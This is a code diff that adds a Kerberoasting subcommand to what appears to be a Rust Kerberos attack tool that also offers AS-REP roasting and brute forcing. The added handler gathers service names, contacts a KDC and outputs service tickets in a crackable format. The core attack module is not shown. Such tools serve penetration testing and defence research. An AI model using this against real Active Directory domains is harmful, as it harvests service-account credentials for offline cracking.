@@ -8,6 +8,7 @@ mod cred_format;
 mod error;
 mod file;
 mod kdc_req_builder;
+mod kerberoast;
 mod krb_cred_plain;
 mod krb_user;
 mod list;
@@ -46,6 +47,7 @@ fn main_inner(args: Arguments) -> Result<()> {
         Arguments::AsRepRoast(args) => asreproast(args),
         Arguments::Brute(args) => brute(args),
         Arguments::Convert(args) => convert(args),
+        Arguments::KerbeRoast(args) => kerberoast(args),
         Arguments::List(args) => list(args),
     }
 }
@@ -200,3 +202,39 @@ fn asreproast(args: args::asreproast::Arguments) -> Result<()> {
         &args.cipher
     );
 }
+
+
+fn kerberoast(args: args::kerberoast::Arguments) -> Result<()> {
+    init_log(args.verbosity);
+
+    let services = match read_file_lines(&args.services) {
+        Ok(users) => users,
+        Err(_) => vec![args.services],
+    };
+
+    let transporter = resolve_and_get_tranporter(
+        args.kdc_ip,
+        &args.realm,
+        args.kdc_port,
+        args.transport_protocol,
+    )?;
+
+    let creds_file = utils::get_ticket_file(
+        args.out_file,
+        &args.username,
+        &args.credential_format,
+    );
+    
+    let user = KerberosUser::new(args.username, args.realm);    
+
+    return kerberoast::kerberoast(
+        user,
+        services,
+        &creds_file,
+        args.user_key.as_ref(),
+        &*transporter,
+        args.credential_format,
+        args.crack_format,
+    );
+}
+
